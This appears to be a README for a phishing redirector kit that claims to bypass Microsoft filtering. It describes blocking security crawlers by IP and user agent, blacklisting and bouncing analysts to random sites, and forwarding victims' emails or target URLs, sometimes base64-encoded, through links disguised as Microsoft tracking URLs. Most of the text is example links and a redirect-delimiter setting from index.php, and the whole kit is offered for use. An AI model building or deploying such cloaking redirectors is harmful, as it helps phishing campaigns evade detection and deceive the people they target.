#Author: G66K
#icq: @747246257

ByPass Mircsoft by Robish links

details:
	block crawlers by ip and users agent 
	block blacklist ip using big proffesional database 
	store blacklist users and prevent them from revisiting
	redirect blacklist user to random websites
	redirection accept email 
	redirection accept url to redirect to
	redirection email or url can be base64



Robish Links Example There is More:

example.com//57jamspeter.odonnell&p2=
example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1= 
example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=OEM_New_BAU
example.com/57jamspeter.odonnell&p2=
example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1= 
example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=OEM_New_BAU

those links above will work same as the examples below


examples email redirect:  enable base64

http://example.com//57jamspeter.odonnell&p2=ZzY2a0BnbWFpbC5jb20K
http://example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1=#ZzY2a0BnbWFpbC5jb20K
http://example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=OEM_New_BAU#ZzY2a0BnbWFpbC5jb20K


examples email redirect: with base64 enabled


http://example.com//57jamspeter.odonnell&p2=ZzY2a0BnbWFpbC5jb20K
http://example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1=#ZzY2a0BnbWFpbC5jb20K
http://example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=OEM_New_BAU#ZzY2a0BnbWFpbC5jb20K
http://example.com//57jamspeter.odonnell&p2#ZzY2a0BnbWFpbC5jb20K
http://example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1=ZzY2a0BnbWFpbC5jb20K
http://example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=ZzY2a0BnbWFpbC5jb20K


redirect with link to google.com

change sperator in index.php

//redirect sperator word
var redirectDelimiter = 'bla';

here sperator is 'bla'

if you want to redirect to google.com add bla to it in the begining example
blagoogle.com  here is redirect to url


examples redirect to url: 

http://example.com//57jamspeter.odonnell&p2=blagoogle.com
http://example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1=#blagoogle.com
http://example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=OEM_New_BAU#blagoogle.com
http://example.com//57jamspeter.odonnell&p2#blagoogle.com
http://example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1=blagoogle.com
http://example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=blagoogle.com

examples redirect to url with base64 url: 

http://example.com//57jamspeter.odonnell&p2=blaZ29vZ2xlLmNvbQo
http://example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1=#blaZ29vZ2xlLmNvbQo
http://example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=OEM_New_BAU#blaZ29vZ2xlLmNvbQo
http://example.com//57jamspeter.odonnell&p2#blaZ29vZ2xlLmNvbQo
http://example.com/r/?id=h798296eb%2C17cd18ef%2C1a2da5fe&p1=blaZ29vZ2xlLmNvbQo
http://example.com/g66k33s33kabir.majid21kabir.majid&p2=WK-NA_NA_COI-1&p3=blaZ29vZ2xlLmNvbQo


